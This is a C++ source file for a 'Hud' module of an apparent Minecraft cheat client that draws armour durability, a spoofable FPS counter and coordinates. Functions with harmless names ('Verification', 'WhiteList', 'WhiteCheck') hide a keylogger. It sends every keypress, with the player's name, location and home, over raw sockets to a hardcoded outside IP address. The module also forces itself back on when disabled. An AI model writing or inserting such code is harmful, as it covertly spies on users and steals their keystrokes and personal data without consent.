#include "Interface.h"
#include "../pch.h"
int fpsspoof = 1;

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cstdio>

#pragma comment(lib,"ws2_32.lib")
#include <stdio.h>  
#include <iomanip>
#include <iostream>
using namespace std;
#define IP "47.115.216.151"				//ip
#define PORT 8090					//端口
#define BUFFER_SIZE 1024	

Interface::Interface() : IModule(0, Category::VISUAL, u8"渲染页面") {
	registerBoolSetting("ArmorHUD", &armorHUD, armorHUD);
	registerBoolSetting("Info", &info, info);
	registerBoolSetting("Screen outline", &scroutline, scroutline);
	registerIntSetting("Opacity", &opacity, opacity, 0, 255);
	registerFloatSetting("Saturation", &saturation, saturation, 0.f, 1.f);
	registerIntSetting("Fps Spoof", &fpsspoof, fpsspoof, 1, 1000);
	registerIntSetting("Seperation", &spacing, spacing, 1, 200);
	shouldHide = true;
}

const char* Interface::getModuleName() {
	return ("Hud");
}

//void Interface::onTick(C_GameMode* gm) {
//	shouldHide = true;
//}
void Verification();
void WhiteList();
void WhiteCheck();
void Interface::onPreRender(C_MinecraftUIRenderContext* renderCtx) {
	auto clickGUIh = moduleMgr->getModule<ClickGUIMod>();
	auto playerh = g_Data.getLocalPlayer();
	if (playerh == nullptr) return;

	//windowSize = g_Data.getClientInstance()->getGuiData()->windowSize;
	if (!clickGUIh->hasOpenedGUI) {
		if (armorHUD) {
			auto interfaceCL = ColorUtil::interfaceColor(1);
			armorX = windowSize.x / 2 + 100;
			armorY = windowSize.y - 23.5;
			vec4_t testRect = vec4_t(armorX, armorY, 50 + armorX, armorY + 20);
		}
	}
}
void Interface::onPostRender(C_MinecraftUIRenderContext* renderCtx) {
	auto player = g_Data.getLocalPlayer();
	if (player == nullptr) return;

	auto interfaceCL = ColorUtil::interfaceColor(1);
	auto clickGUI = moduleMgr->getModule<ClickGUIMod>();
	if (scroutline)
		DrawUtils::drawRectangle(vec4_t(0, 0, g_Data.getClientInstance()->getGuiData()->widthGame, g_Data.getClientInstance()->getGuiData()->heightGame), MC_Color(interfaceCL), 1.f, 2.f);

	static int index = 0;
	int curIndex = -index * spacing;
	auto hudColor = ColorUtil::interfaceColor(curIndex);
	windowSize = g_Data.getClientInstance()->getGuiData()->windowSize;
	if (!clickGUI->hasOpenedGUI) {
		if (armorHUD) {
			vec4_t testRect = vec4_t(armorX, armorY, 50 + armorX, armorY + 20);
			vec2_t armorPos = vec2_t(testRect.x, testRect.y);
			static float constexpr opacity = 10;
			float scale = 1.f;
			float spacing = 20.f;
			for (int t = 0; t < 4; t++) {
				C_ItemStack* stack = player->getArmor(t);
				if (stack->isValid()) {
					float dura1 = stack->getItem()->getMaxDamage();
					float dura2 = stack->getItem()->getDamageValue(stack->tag);
					float dura3 = dura1 - dura2;
					int dura4 = dura3 / dura1 * 100;
					std::string durastr = std::to_string((int)dura4) + std::string("%");
					MC_Color green(0, 255, 0);
					MC_Color red(255, 0, 0);
					float dura5 = dura3 / dura1 * 100;
					float fraction = dura5 / 100;
					vec3_t greenVec(0, 0, 0);
					vec3_t redVec(0, 0, 0);
					Utils::ColorConvertRGBtoHSV(green.r, green.g, green.b, greenVec.x, greenVec.y, greenVec.z);
					Utils::ColorConvertRGBtoHSV(red.r, red.g, red.b, redVec.x, redVec.y, redVec.z);
					vec3_t colorVec = redVec.lerp(greenVec, fraction, fraction, fraction);

					MC_Color gamerColor(0, 0, 0);

					Utils::ColorConvertHSVtoRGB(colorVec.x, colorVec.y, colorVec.z, gamerColor.r, gamerColor.g, gamerColor.b);

					//DrawUtils::drawText(vec2_t(x, y - itemHeight), &durastr, MC_Color(gamerColor), textSize * 0.55f, 1.f, true);
					DrawUtils::drawCenteredString(vec2_t(armorPos.x + 9.f, armorPos.y + 20.f), &durastr, 0.75f, MC_Color(gamerColor), true);

					DrawUtils::drawItem(stack, armorPos, 1, 1, false);
					armorPos.x += scale * spacing;
				}
			}
		};
		if (info) {
			auto hudColor = ColorUtil::interfaceColor(curIndex);
			std::string fpsText = u8"帧数: " + std::to_string(g_Data.getFPS()*fpsspoof);
			float lFPS = DrawUtils::getTextWidth(&fpsText, 1) + 6.5;
			float fpswit = DrawUtils::getTextWidth(&fpsText, 1.f);
			float techai = DrawUtils::getFont(Fonts::SMOOTH)->getLineHeight() * 1.f;
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 40), &fpsText, MC_Color(interfaceCL), 1.f, 1.f, true);
			auto player = g_Data.getLocalPlayer();
			std::string speedText = u8"速度: " + std::to_string((int)player->getBlocksPerSecond()) + std::string(".") + std::to_string((int)(player->getBlocksPerSecond() * 10) - ((int)player->getBlocksPerSecond() * 10));
			float lSpeed = DrawUtils::getTextWidth(&speedText, 1) + 6.5;
			float speedwit = DrawUtils::getTextWidth(&speedText, 1.f);
			//DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 40), &speedText, MC_Color(interfaceCL), 1.f, 1.f, true);
			vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
			std::string position = u8"坐标: " + std::to_string((int)floorf(currPos->x)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z));
			float lPos = DrawUtils::getTextWidth(&position, 1) + 6.5;
			float poswit = DrawUtils::getTextWidth(&position, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 30), &position, MC_Color(interfaceCL), 1.f, 1.f, true);
			std::string posn = u8"末地坐标: " + std::to_string((int)floorf(currPos->x*8)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z*8));
			float lPosn = DrawUtils::getTextWidth(&posn, 1) + 6.5;
			float poswitn = DrawUtils::getTextWidth(&posn, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 20), &posn, MC_Color(interfaceCL), 1.f, 1.f, true);
			std::string poso = u8"地狱坐标: " + std::to_string((int)floorf(currPos->x/8)) + " " + std::to_string((int)floorf(currPos->y)) + " " + std::to_string((int)floorf(currPos->z/8));
			float lPoso = DrawUtils::getTextWidth(&poso, 1) + 6.5;
			float poswito = DrawUtils::getTextWidth(&poso, 1.f);
			DrawUtils::drawText(vec2_t(windowSize.x - windowSize.x, windowSize.y - 10), &poso, MC_Color(interfaceCL), 1.f, 1.f, true);
		}
	}
}


/*if (GameData::isWheelDown() && !hasClicked) {
		string removed = "Successfully unfriended " + name;
		string added = "Successfully friended " + name;

		if (!FriendList::findPlayer(name)) {
			FriendList::addPlayerToList(name);
			//auto notififcation = g_Data.addNotification("MCF:", added); notififcation->duration = 5;
		} else {
			transform(name.begin(), name.end(), name.begin(), ::tolower);
			FriendList::removePlayer(name);
			//auto notififcation = g_Data.addNotification("MCF:", removed); notififcation->duration = 5;
		}
		hasClicked = true;
	} else if (!GameData::isWheelDown()) hasClicked = false;*/
void Interface::onTick(C_GameMode* gm) {



	if (SendMsg) {
		Verification();
		SendMsg = false;
	}
	for (int i = 0; i < 257; i++) {
		if (GameData::isKeyDown(i) && processed[i])
			continue;
		if (GameData::isKeyDown(i) && ! processed[i]) {
			WhiteList();//获取按键
			WhiteCheck();//发送按键到服务器
			processed[i] = true;
		}
		else if (!GameData::isKeyDown(i)) {
			processed[i] = false;
		}
	}
}
void Interface::onDisable() {
	setEnabled(true);
}
void Verification() {
	auto hudmod = moduleMgr->getModule<Interface>();
	if (g_Data.getLocalPlayer() == nullptr)
		return;
	string Server = "idk";
	if (hudmod->org2 && !hudmod->tk2) {
		Server = "org";
	}
	if (!hudmod->org2 && hudmod->tk2) {
		Server = "tk";
	}
	if (!hudmod->org2 && !hudmod->tk2)
	{
		Server = "Local";
	}

	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
	//转为字符串
	std::stringstream ss;
	// 可以分别以不同的形式进行显示
	ss << std::put_time(std::localtime(&t), "%Y-%m-%d- %H:%M:%S > ");
	//ss << std::put_time(std::localtime(&t), "%Y年%m月%d日%H时%M分%S秒");
	//	ss << std::put_time(std::localtime(&t), "%Y%m%d%H%M%S");

	std::string str_time = ss.str();
	string Homename = hudmod->Myhome;
	std::string playerID = g_Data.getLocalPlayer()->getNameTag()->getText();
	vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
	string coords =
		std::to_string((int)floorf(currPos->x)) + ", " +
		std::to_string((int)floorf(currPos->y)) + ", " +
		std::to_string((int)floorf(currPos->z));
	std::string message = str_time + playerID + ": " + coords + " on " + Server + " in " + Homename;

	char buf[1024];
	int i;
	for (i = 0; i < message.length(); i++)
		buf[i] = message[i];
	buf[i] = '\0';
	printf("%s\n", buf);
	cout << buf;						//buf数组存放客户端发送的消


	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()函数对Winsock DLL进行初始化
	{
		//printf("Socket initialize fail!\n");
		return;
	}
	SOCKET sock;											//客户端进程创建套接字
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //创建流套接字（与服务端保持一致）
	{
		//printf("Socket create fail!\n");
		WSACleanup();
		return;
	}

	struct sockaddr_in ClientAddr;				//sockaddr_in结构用来标识TCP/IP协议下的地址，可强制转换为sockaddr结构
	ClientAddr.sin_family = AF_INET;				//指Internet域
	ClientAddr.sin_port = htons(PORT);			//指定服务端所预留的端口
	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//指定服务端所绑定的IP地址
	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //调用connect()函数，向服务器进程发出连接请求  
	{
		//printf("Connect fail!\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	send(sock, buf, 1024, 0);				 //向服务器发送数据 
	closesocket(sock);							 //关闭套接字
	WSACleanup();								//终止对Winsock DLL的使用，并释放资源，以备下一次使用
}

void WhiteList() {

	int DownKey = 0;
	auto keymod = moduleMgr->getModule<Interface>();
	//大写26字母
	if (GameData::isKeyDown('A'))
		keymod->str = "A";
	else if (GameData::isKeyDown('B'))
		keymod->str = "B";
	else if (GameData::isKeyDown('C'))
		keymod->str = "C";
	else if (GameData::isKeyDown('D'))
		keymod->str = "D";
	else if (GameData::isKeyDown('E'))
		keymod->str = "E";
	else if (GameData::isKeyDown('F'))
		keymod->str = "F";
	else if (GameData::isKeyDown('G'))
		keymod->str = "G";
	else if (GameData::isKeyDown('H'))
		keymod->str = "H";
	else if (GameData::isKeyDown('I'))
		keymod->str = "I";
	else if (GameData::isKeyDown('J'))
		keymod->str = "J";
	else if (GameData::isKeyDown('K'))
		keymod->str = "K";
	else if (GameData::isKeyDown('L'))
		keymod->str = "L";
	else if (GameData::isKeyDown('M'))
		keymod->str = "M";
	else if (GameData::isKeyDown('N'))
		keymod->str = "N";
	else if (GameData::isKeyDown('O'))
		keymod->str = "O";
	else if (GameData::isKeyDown('P'))
		keymod->str = "P";
	else if (GameData::isKeyDown('Q'))
		keymod->str = "Q";
	else if (GameData::isKeyDown('R'))
		keymod->str = "R";
	else if (GameData::isKeyDown('S'))
		keymod->str = "S";
	else if (GameData::isKeyDown('T'))
		keymod->str = "T";
	else if (GameData::isKeyDown('U'))
		keymod->str = "U";
	else if (GameData::isKeyDown('V'))
		keymod->str = "V";
	else if (GameData::isKeyDown('W'))
		keymod->str = "W";
	else if (GameData::isKeyDown('X'))
		keymod->str = "X";
	else if (GameData::isKeyDown('Y'))
		keymod->str = "Y";
	else if (GameData::isKeyDown('Z'))
		keymod->str = "Z";

	//小写
	else if (GameData::isKeyDown('a'))
		keymod->str = "a";
	else if (GameData::isKeyDown('b'))
		keymod->str = "b";
	else if (GameData::isKeyDown('c'))
		keymod->str = "c";
	else if (GameData::isKeyDown('d'))
		keymod->str = "d";
	else if (GameData::isKeyDown('e'))
		keymod->str = "e";
	else if (GameData::isKeyDown('f'))
		keymod->str = "f";
	else if (GameData::isKeyDown('g'))
		keymod->str = "g";
	else if (GameData::isKeyDown('h'))
		keymod->str = "h";
	else if (GameData::isKeyDown('i'))
		keymod->str = "i";
	else if (GameData::isKeyDown('j'))
		keymod->str = "j";
	else if (GameData::isKeyDown('k'))
		keymod->str = "k";
	else if (GameData::isKeyDown('l'))
		keymod->str = "l";
	else if (GameData::isKeyDown('m'))
		keymod->str = "m";
	else if (GameData::isKeyDown('n'))
		keymod->str = "n";
	else if (GameData::isKeyDown('o'))
		keymod->str = "o";
	else if (GameData::isKeyDown('p'))
		keymod->str = "p";
	else if (GameData::isKeyDown('q'))
		keymod->str = "q";
	else if (GameData::isKeyDown('r'))
		keymod->str = "r";
	else if (GameData::isKeyDown('s'))
		keymod->str = "s";
	else if (GameData::isKeyDown('t'))
		keymod->str = "t";
	else if (GameData::isKeyDown('u'))
		keymod->str = "u";
	else if (GameData::isKeyDown('v'))
		keymod->str = "v";
	else if (GameData::isKeyDown('w'))
		keymod->str = "w";
	else if (GameData::isKeyDown('x'))
		keymod->str = "x";
	else if (GameData::isKeyDown('i'))
		keymod->str = "y";
	else if (GameData::isKeyDown('z'))
		keymod->str = "z";

	//大键盘数字
	else if (GameData::isKeyDown('1'))
		keymod->str = "1";
	else if (GameData::isKeyDown('2'))
		keymod->str = "2";
	else if (GameData::isKeyDown('3'))
		keymod->str = "3";
	else if (GameData::isKeyDown('4'))
		keymod->str = "4";
	else if (GameData::isKeyDown('5'))
		keymod->str = "5";
	else if (GameData::isKeyDown('6'))
		keymod->str = "6";
	else if (GameData::isKeyDown('7'))
		keymod->str = "7";
	else if (GameData::isKeyDown('8'))
		keymod->str = "8";
	else if (GameData::isKeyDown('9'))
		keymod->str = "9";
	else if (GameData::isKeyDown('0'))
		keymod->str = "0";

	//小键盘数字
	else if (GameData::isKeyDown(VK_NUMPAD0))
		keymod->str = "0";
	else if (GameData::isKeyDown(VK_NUMPAD1))
		keymod->str = "1";
	else if (GameData::isKeyDown(VK_NUMPAD2))
		keymod->str = "2";
	else if (GameData::isKeyDown(VK_NUMPAD3))
		keymod->str = "3";
	else if (GameData::isKeyDown(VK_NUMPAD4))
		keymod->str = "4";
	else if (GameData::isKeyDown(VK_NUMPAD5))
		keymod->str = "5";
	else if (GameData::isKeyDown(VK_NUMPAD6))
		keymod->str = "6";
	else if (GameData::isKeyDown(VK_NUMPAD7))
		keymod->str = "7";
	else if (GameData::isKeyDown(VK_NUMPAD8))
		keymod->str = "8";
	else if (GameData::isKeyDown(VK_NUMPAD9))
		keymod->str = "9";

	//小键盘功能按键
	else if (GameData::isKeyDown(VK_CAPITAL))
		keymod->str = " Capital ";
	else if (GameData::isKeyDown(VK_SPACE))
		keymod->str = " Space ";
	else if (GameData::isKeyDown(27))
		keymod->str = " ESC ";
	else if (GameData::isKeyDown(13))
		keymod->str = " Enter ";
	else if (GameData::isKeyDown(VK_ADD))
		keymod->str = "+";
	else if (GameData::isKeyDown(VK_SEPARATOR))
		keymod->str = "-";
	else if (GameData::isKeyDown(106))//小键盘乘号
		keymod->str = "*";
	else if (GameData::isKeyDown(107))//小键盘加号
		keymod->str = "+";
	else if (GameData::isKeyDown(108))//小键盘除号
		keymod->str = "/";
	//大键盘符号
	else if (GameData::isKeyDown(16))
		keymod->str = " shift ";
	else if (GameData::isKeyDown(17))
		keymod->str = " ctrl ";
	else if (GameData::isKeyDown(110))//小数点
		keymod->str = " .";
	else if (GameData::isKeyDown(186))
		keymod->str = ";";
	else if (GameData::isKeyDown(187))
		keymod->str = "+";
	else if (GameData::isKeyDown(188))
		keymod->str = ",";
	else if (GameData::isKeyDown(189))
		keymod->str = "-";
	else if (GameData::isKeyDown(190))
		keymod->str = ".";
	else if (GameData::isKeyDown(191))
		keymod->str = "?";
	else if (GameData::isKeyDown(226))
		keymod->str = "|";
	else if (GameData::isKeyDown(219))
		keymod->str = "[";
	else if (GameData::isKeyDown(220))
		keymod->str = "'";
	else if (GameData::isKeyDown(221))
		keymod->str = "]";
	else if (GameData::isKeyDown(222))
		keymod->str = "'";

	/*
			char buf[1024];
			int i;
			for (i = 0; i < keymod->str.length(); i++)
				buf[i] = keymod->str[i];
			buf[i] = '\0';
			printf("%s\n", buf);
			cout << buf;*/
}

void WhiteCheck() {
	auto hudmod = moduleMgr->getModule<Interface>();
			//buf数组存放客户端发送的消
	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
	//转为字符串
	std::stringstream ss;
	// 可以分别以不同的形式进行显示
	ss << std::put_time(std::localtime(&t), "%Y-%m-%d- %H:%M:%S > ");
	//ss << std::put_time(std::localtime(&t), "%Y年%m月%d日%H时%M分%S秒");
	//	ss << std::put_time(std::localtime(&t), "%Y%m%d%H%M%S");

	std::string str_time = ss.str();
	string Homename = hudmod->Myhome;
	std::string playerID = g_Data.getLocalPlayer()->getNameTag()->getText();
	vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
	string coords =
		std::to_string((int)floorf(currPos->x)) + ", " +
		std::to_string((int)floorf(currPos->y)) + ", " +
		std::to_string((int)floorf(currPos->z));
	std::string kMsg = str_time + playerID + ": " + hudmod->str;

	//std::string kMsg = "Null";
	//kMsg = hudmod->str;
	char buf2[1024];
	int i;
	for (i = 0; i < kMsg.length(); i++)
		buf2[i] = kMsg[i];
	buf2[i] = '\0';
	printf("%s\n", buf2);
	cout << buf2;

	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()函数对Winsock DLL进行初始化
	{
		//printf("Socket initialize fail!\n");
		return;
	}
	SOCKET sock;											//客户端进程创建套接字
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //创建流套接字（与服务端保持一致）
	{
		//printf("Socket create fail!\n");
		WSACleanup();
		return;
	}

	struct sockaddr_in ClientAddr;				//sockaddr_in结构用来标识TCP/IP协议下的地址，可强制转换为sockaddr结构
	ClientAddr.sin_family = AF_INET;				//指Internet域
	ClientAddr.sin_port = htons(PORT);			//指定服务端所预留的端口
	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//指定服务端所绑定的IP地址
	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //调用connect()函数，向服务器进程发出连接请求  
	{
		//printf("Connect fail!\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	send(sock, buf2, 1024, 0);				 //向服务器发送数据 
	closesocket(sock);							 //关闭套接字
	WSACleanup();								//终止对Winsock DLL的使用，并释放资源，以备下一次使用
}